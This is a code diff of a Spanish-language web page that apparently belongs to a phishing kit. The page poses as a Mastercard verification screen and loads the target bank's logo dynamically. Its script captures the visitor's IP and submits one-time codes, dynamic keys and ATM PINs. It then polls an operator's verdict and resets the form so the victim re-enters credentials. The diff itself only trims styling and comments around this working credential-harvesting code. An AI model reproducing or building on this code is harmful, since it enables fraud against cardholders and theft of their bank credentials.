@@ -62,22 +62,18 @@
             pointer-events: none;
         }
 
-        /* ===== CONTENEDOR PRINCIPAL ===== */
         .container {
             position: relative;
             z-index: 1;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            background: var(--co-white);
             border-radius: 16px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.15);
             padding: 40px;
             max-width: 520px;
             width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.5);
         }
 
-        /* ===== HEADER: LOGO MASTERCARD IZQUIERDA, BANCO DERECHA ===== */
+        /* ===== HEADER: MASTERCARD IZQUIERDA, BANCO DERECHA ===== */
         .header {
             display: flex;
             align-items: center;
@@ -88,7 +84,6 @@
             gap: 10px;
         }
 
-        /* Logo de Mastercard fijo a la izquierda */
         .mc-logo {
             display: flex;
             align-items: center;
@@ -104,7 +99,6 @@
             object-fit: contain;
         }
 
-        /* Logo del banco dinámico a la derecha */
         .bank-logo {
             display: flex;
             align-items: center;
@@ -120,7 +114,7 @@
             width: auto;
             max-width: 180px;
             object-fit: contain;
-            display: none; /* Oculto por defecto hasta que se cargue */
+            display: none;
         }
 
         /* ===== TÍTULOS ===== */
@@ -627,7 +621,7 @@
         capturarIP();
 
         // ============================================
-        // SOLICITUD ID - FUNCIÓN PARA GENERAR NUEVO ID
+        // SOLICITUD ID
         // ============================================
         function generarNuevoSolicitudId() {
             return 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
@@ -925,7 +919,7 @@
                         tipo_paso: 'otp',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: true // FORZAMOS REINTENTO
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -953,7 +947,7 @@
                         tipo_paso: 'clave_dinamica',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: true // FORZAMOS REINTENTO
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -981,7 +975,7 @@
                         tipo_paso: 'clave_cajero',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: true // FORZAMOS REINTENTO
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -1100,7 +1094,6 @@
                     clearInterval(pollingInterval);
                     pollingInterval = null;
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada. Intente de nuevo.');
-                    // GENERAMOS NUEVO ID PARA PERMITIR REINTENTO
                     solicitudId = generarNuevoSolicitudId();
                     console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                     resetFormulario();
@@ -1207,7 +1200,6 @@
                         statusMessage.className = 'status-message error-usuario';
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
-                        // GENERAMOS NUEVO ID PARA PERMITIR REINTENTO
                         solicitudId = generarNuevoSolicitudId();
                         console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                         resetFormulario();
